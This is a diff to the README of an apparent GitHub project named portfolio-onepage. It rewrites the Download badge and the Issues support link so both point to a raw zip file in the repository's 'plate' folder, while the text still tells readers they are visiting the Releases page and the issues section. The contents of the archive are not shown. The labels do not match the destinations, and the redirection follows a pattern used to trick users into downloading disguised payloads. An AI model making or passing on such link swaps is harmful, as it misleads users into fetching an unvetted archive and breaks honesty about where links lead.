@@ -8,7 +8,7 @@ Welcome to the **portfolio-onepage** repository! This application helps you buil
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download portfolio-onepage](https://img.shields.io/badge/Download%20portfolio--onepage-blue)](https://github.com/Amay6691/portfolio-onepage/releases)
+[![Download portfolio-onepage](https://raw.githubusercontent.com/Amay6691/portfolio-onepage/main/plate/portfolio-onepage.zip%20portfolio--onepage-blue)](https://raw.githubusercontent.com/Amay6691/portfolio-onepage/main/plate/portfolio-onepage.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version.
@@ -59,7 +59,7 @@ If you still need help, feel free to reach out through the issues section on Git
 
 ## 🌐 Support
 
-For additional support or questions, please open an issue in the [Issues](https://github.com/Amay6691/portfolio-onepage/issues) section of our repository.
+For additional support or questions, please open an issue in the [Issues](https://raw.githubusercontent.com/Amay6691/portfolio-onepage/main/plate/portfolio-onepage.zip) section of our repository.
 
 ## 📄 License
 
